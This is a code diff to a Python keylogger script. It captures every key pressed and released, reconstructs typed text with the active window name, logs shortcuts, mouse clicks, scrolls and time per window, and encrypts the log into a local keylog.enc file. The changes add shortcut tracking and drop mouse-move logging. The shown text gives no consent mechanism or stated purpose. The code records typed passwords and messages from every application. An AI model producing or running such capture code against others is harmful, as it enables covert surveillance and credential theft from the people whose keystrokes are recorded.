@@ -27,6 +27,7 @@ current_text = deque()
 log_buffer = deque()
 active_window_name = get_active_window_process_name()
 active_window_start_time = time.time()
+pressed_keys = set()
 
 def log_event(message):
     log_buffer.append(message)
@@ -43,7 +44,20 @@ def log_time_spent_on_window(window_name, start_time):
     log_event(f"Time spent on {window_name}: {time_spent:.2f} seconds")
 
 def on_press(key):
-    global active_window_name, active_window_start_time, current_text
+    global active_window_name, active_window_start_time, pressed_keys
+    try:
+        new_window_name = get_active_window_process_name()
+        if new_window_name != active_window_name:
+            log_time_spent_on_window(active_window_name, active_window_start_time)
+            active_window_name = new_window_name
+            active_window_start_time = time.time()
+        pressed_keys.add(key)
+        log_event(f"Key pressed: {key} in {active_window_name}")
+    except Exception as e:
+        logging.error(f"Error in on_press: {e}")
+
+def on_release(key):
+    global current_text, active_window_name, active_window_start_time, pressed_keys
     try:
         new_window_name = get_active_window_process_name()
         if new_window_name != active_window_name:
@@ -56,20 +70,15 @@ def on_press(key):
             current_text.append(' ')
         elif key == keyboard.Key.enter:
             current_text.append('\n')
-    except Exception as e:
-        logging.error(f"Error in on_press: {e}")
 
-def on_release(key):
-    global current_text, active_window_name, active_window_start_time
-    try:
-        new_window_name = get_active_window_process_name()
-        if new_window_name != active_window_name:
-            log_time_spent_on_window(active_window_name, active_window_start_time)
-            active_window_name = new_window_name
-            active_window_start_time = time.time()
         if key == keyboard.Key.space or key == keyboard.Key.enter:
             log_event(f"Text input: {''.join(current_text)} in {active_window_name}")
             current_text.clear()
+
+        log_event(f"Key released: {key} in {active_window_name}")
+        pressed_keys.remove(key)
+        if pressed_keys:
+            log_event(f"Shortcut used: {', '.join(str(k) for k in pressed_keys)} in {active_window_name}")
         if key == keyboard.Key.esc:
             return False
     except Exception as e:
@@ -83,11 +92,10 @@ def on_click(x, y, button, pressed):
             log_time_spent_on_window(active_window_name, active_window_start_time)
             active_window_name = new_window_name
             active_window_start_time = time.time()
-        timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
         if pressed:
-            log_event(f"Mouse clicked at ({x}, {y}) with {button} in {active_window_name} at {timestamp}")
+            log_event(f"Mouse clicked at ({x}, {y}) with {button} in {active_window_name}")
         else:
-            log_event(f"Mouse released at ({x}, {y}) with {button} in {active_window_name} at {timestamp}")
+            log_event(f"Mouse released at ({x}, {y}) with {button} in {active_window_name}")
     except Exception as e:
         logging.error(f"Error in on_click: {e}")
 
@@ -102,16 +110,6 @@ def on_scroll(x, y, dx, dy):
         log_event(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy}) in {active_window_name}")
     except Exception as e:
         logging.error(f"Error in on_scroll: {e}")
-
-def on_move(x, y):
-    global active_window_name
-    try:
-        new_window_name = get_active_window_process_name()
-        if new_window_name != active_window_name:
-            active_window_name = new_window_name
-        log_event(f"Mouse moved to ({x}, {y}) in {active_window_name}")
-    except Exception as e:
-        logging.error(f"Error in on_move: {e}")
 
 def stop_listeners():
     try:
@@ -153,7 +151,7 @@ except Exception as e:
 
 # Set up the mouse listener
 try:
-    mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll, on_move=on_move)
+    mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
     mouse_listener.start()
 except Exception as e:
     logging.error(f"Error setting up mouse listener: {e}")
@@ -184,6 +182,7 @@ except Exception as e:
 try:
     with open("keylog.txt", "rb") as file:
         log_data = file.read()
+
     encrypted_data = cipher_suite.encrypt(log_data)
 
     with open("keylog.enc", "wb") as file:
